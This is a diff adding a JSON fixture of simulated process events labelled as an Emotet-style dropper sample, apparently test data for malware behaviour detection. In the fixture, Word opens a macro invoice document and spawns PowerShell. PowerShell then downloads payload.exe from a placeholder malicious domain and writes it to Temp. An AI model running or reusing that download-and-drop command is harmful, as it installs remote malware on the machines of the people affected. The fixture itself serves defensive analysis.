@@ -1,0 +1,41 @@
+{
+  "sample_id": "dropper_emotet_01",
+  "events": [
+    {
+      "event_id": "evt_4001",
+      "event_order": 1,
+      "process_id": 7890,
+      "parent_process_id": 4020,
+      "timestamp": "2026-07-28T10:40:00Z",
+      "api_name": "CreateProcessInternalW",
+      "arguments": {
+        "image_name": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
+        "command_line": "WINWORD.EXE C:\\Users\\Victim\\Downloads\\Invoice_9921.docm"
+      }
+    },
+    {
+      "event_id": "evt_4002",
+      "event_order": 2,
+      "process_id": 8100,
+      "parent_process_id": 7890,
+      "timestamp": "2026-07-28T10:40:03Z",
+      "api_name": "CreateProcessInternalW",
+      "arguments": {
+        "image_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://malicious-domain-example.com/payload.exe', '$env:TEMP\\payload.exe')"
+      }
+    },
+    {
+      "event_id": "evt_4003",
+      "event_order": 3,
+      "process_id": 8100,
+      "parent_process_id": 7890,
+      "timestamp": "2026-07-28T10:40:06Z",
+      "api_name": "WriteFile",
+      "arguments": {
+        "target_path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe",
+        "bytes_written": 154200
+      }
+    }
+  ]
+}
